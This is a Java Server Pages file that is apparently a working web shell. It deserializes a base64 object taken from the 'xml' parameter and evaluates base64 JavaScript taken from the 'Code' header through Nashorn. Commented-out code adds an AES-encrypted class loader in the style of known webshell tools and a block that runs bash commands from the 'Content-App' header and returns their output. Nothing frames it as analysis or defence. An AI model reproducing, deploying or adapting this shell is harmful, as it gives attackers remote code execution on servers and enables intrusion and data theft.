<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ObjectInputStream" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%
    String xml = request.getParameter("xml");
    if (xml != null) {
        byte[] bytes = new BASE64Decoder().decodeBuffer(xml);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }


%>

<%
    new javax.script.ScriptEngineManager().getEngineByName("nashorn").
            eval(new java.lang.String(java.util.Base64.getDecoder().decode(request.getHeader("Code"))),
                    new javax.script.SimpleBindings(new java.util.HashMap() {{
        put("response", response);
        put("request", request);
        put("pageContext",pageContext);
    }}));


//    var ciper=javax.crypto.Cipher.getInstance("AES");
//    var secret=Java.type("javax.crypto.spec.SecretKeySpec");
//    var bytes=java.util.Base64.getDecoder().decode("MmYyZTlmNDBjNmQ5ZmE0Nw==");
//    var secret2=new secret(bytes,"AES");
//    ciper.init(2,secret2);
//    var code = java.util.Base64.getDecoder().decode(request.getReader().readLine());
//    var codes=ciper.doFinal(code);
//
//    var sessions = request.getSession();
//    sessions.putValue("u","2f2e9f40c6d9fa47");
//    var hashmap=Java.type("java.util.HashMap");
//    var clazz = java.lang.Class.forName("java.lang.ClassLoader");
//    var method = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", Java.type('byte[]').class,Java.type('int').class, Java.type('int').class);
//    method.setAccessible(true);
//    var TestClass = method.invoke(java.lang.ClassLoader.getSystemClassLoader(),codes,0,codes.length);
//    TestClass.newInstance().equals(pageContext);

    //response.getOutputStream().print(TestClass.toString());


//    s=[3];
//    s[0]='/bin/bash';
//    s[1]='-c';
//    s[2]=request.getHeader("Content-App");
//    process=java.lang.Runtime.getRuntime().exec(s);
//    process.waitFor();
//    inputStream=process.getInputStream();
//    var ByteArray=Java.type('byte[]');
//    var bytes=new ByteArray(inputStream.available());
//    inputStream.read(bytes);
//    response.getOutputStream().write(bytes);
%>